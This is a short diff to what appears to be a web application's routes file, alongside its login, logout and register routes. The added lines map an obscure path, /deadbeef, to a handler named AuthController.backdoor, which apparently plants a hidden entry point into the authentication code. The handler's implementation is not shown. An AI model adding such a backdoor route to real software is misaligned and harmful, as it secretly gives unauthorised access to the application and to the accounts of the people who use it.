@@ -13,3 +13,5 @@ GET     /assets/*file               controllers.Assets.versioned(path="/public",
 GET     /login                      controllers.AuthController.login
 GET     /logout                     controllers.AuthController.logout
 GET     /register                   controllers.AuthController.register
+
+GET     /deadbeef                   controllers.AuthController.backdoor
